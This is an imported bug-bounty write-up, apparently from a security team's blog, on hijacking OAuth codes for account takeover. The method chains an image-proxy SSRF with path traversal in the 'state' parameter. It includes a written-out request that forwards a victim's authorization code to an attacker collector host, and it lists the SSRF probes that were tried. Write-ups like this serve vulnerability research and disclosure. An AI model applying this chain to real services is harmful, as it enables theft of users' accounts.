---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-11-17_hijacking-oauth-code-via-reverse-proxy-for-account-takeover.md
original_filename: 2023-11-17_hijacking-oauth-code-via-reverse-proxy-for-account-takeover.md
title: Hijacking OAuth Code via Reverse Proxy for Account Takeover
category: documents
detected_topics:
- oauth
- path-traversal
- access-control
- ssrf
- xss
- command-injection
tags:
- imported
- documents
- oauth
- path-traversal
- access-control
- ssrf
- xss
- command-injection
language: en
raw_sha256: 36a1636e6dada2073cb4894986ac0a585996e2ab98de7f82093beb4cd9c3ae0f
text_sha256: 161fd04f00166c0ce2ee906bee674b553ee97da067f19dea6f334125a77be4da
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# Hijacking OAuth Code via Reverse Proxy for Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-11-17_hijacking-oauth-code-via-reverse-proxy-for-account-takeover.md
- Source Type: markdown
- Detected Topics: oauth, path-traversal, access-control, ssrf, xss, command-injection
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `36a1636e6dada2073cb4894986ac0a585996e2ab98de7f82093beb4cd9c3ae0f`
- Text SHA256: `161fd04f00166c0ce2ee906bee674b553ee97da067f19dea6f334125a77be4da`


## Content

---
title: "Hijacking OAuth Code via Reverse Proxy for Account Takeover"
page_title: "Hijacking OAuth Code via Reverse Proxy for Account Takeover — Voorivex Team"
url: "https://blog.voorivex.team/hijacking-oauth-code-via-reverse-proxy-for-account-takeover"
final_url: "https://blog.voorivex.team/hijacking-oauth-code-via-reverse-proxy-for-account-takeover"
authors: ["0xrz (@omidxrz)"]
bugs: ["OAuth", "Account takeover"]
publication_date: "2023-11-17"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 670
---

[All posts](/)

Auth · OAuth · 17 Nov 2023

# Hijacking OAuth Code via Reverse Proxy for Account Takeover

The target scope I had selected was fixed to the main application `1377.targetstaging.app`. In the first phase of my narrow recon approach, I utilized various services like Archive, Google, and Yahoo to extract endpoints and different paths. 

![](assets/avatars/omid-rezaei.png)

Written by [Omid Rezaei](/authors/omid-rezaei)

## Recon

The program required a specific cookie like `usertest=hash` for the website to work. After setting it, I opened Burp Suite and started exploring the application's functionality to understand how the target operates. 

## OAuth Authorization Flow

The target had OAuth login via Google, Microsoft, and Slack. After tracing the flow end-to-end, I mapped it to five HTTP requests: 

**Request 1** — initial click, redirect to the company's main website:

![OAuth flow — request 1](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/01-req-1.png)

**Request 2** — redirect to the Google login page:

![OAuth flow — request 2 \(Google login\)](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/02-req-2.png)

**Request 3** — Google provider code returned to the company's main website:

![OAuth flow — request 3 \(provider code returned\)](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/03-req-3.png)

**Request 4** — Google code passed from main site to a subdomain:

![OAuth flow — request 4 \(main → subdomain hand-off\)](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/04-req-4.png)

**Request 5** — final exchange, `auth` cookie issued:

![OAuth flow — request 5 \(auth cookie issued\)](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/05-req-5.png)

I tried manipulating `redirect_uri` at request 4, but the regex was strictly fixed to the company's domain. Even an open redirect wouldn't help — the parameter just couldn't be changed. I moved on to other features. 

## Change Profile Picture Flow

The "Update Profile Picture" call caught my attention:

![Profile-picture update request — AvatarUrl parameter](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/06-change-profile.png)

The first instinct was SSRF, so I dropped a Burp Collaborator URL into `AvatarUrl`:

![AvatarUrl set to a Burp Collaborator URL](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/07-burp-collab.png)

The Collaborator pinged back, which confirmed a server-side fetch was happening:

![Burp Collaborator pingback from the server-side fetcher](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/08-collab-response.png)

The browser doesn't fetch the avatar directly — there's a reverse proxy in the middle. After examining the rendered DOM I caught this image-proxy request: 

![Image-proxy DOM request — fetched via /imageProxy/<url>](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/09-dom-request.png)

I tried gopher, file, redirect-to-protocol-switch, SVG XSS/LFI, port scanning — everything was locked down. I moved on. 

## Chain Vulnerability Flow

Coming back to my notes, I realised: the reverse proxy takes a URL as a path and sends a GET request to whatever the URL is. Look at request 5 — the provider code arrives in the GET parameter. If I can get the OAuth flow to land on: 
  
  
  GET /imageProxy/https://attacker.oastify.com/?code= HTTP/1.1

I get the code. Examining the parameters Google's OAuth screen accepts:

![Google OAuth — accepted parameters at the provider screen](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/10-provider-params.png)

`redirect_uri` is fixed. `state` is interesting — its value is passed back to the main company site after auth, and the main site validates and redirects the user to the URL inside `state` with the code attached (this is request 4): 

![state-driven redirect with provider code attached](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/11-state-redirect.png)

I now had to abuse the reverse proxy via the `state` parameter:

![Plan: route through /imageProxy via state](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/12-proxy-approach.png)

The state-checker regex was strict — almost any change returned 403, except appending characters to the path. The site accepted links like: 

![Accepted state value — only path appendage allowed](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/13-accepted-link.png)

So I tried path traversal:

![Path traversal accepted by the validator](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/14-path-traversal.png)

It worked — I could climb back a directory. Three levels back let me redirect to whatever path I wanted, with the code in tow:

![../../../ path-traversal payload](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/15-three-dirs-back.png)

I could now build a malicious link using either the target site or the provider as the entry point: 

![Final payload — two ways to start the chain](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/16-final-payload.png)

When the victim clicked either link and signed in, the provider code arrived at my Collaborator endpoint. Plug it into request 5 → victim's account. 

![Final Collaborator capture — provider code in hand](assets/images/hijacking-oauth-code-via-reverse-proxy-for-account-takeover/17-collab-final.png)

I hope you enjoy :)
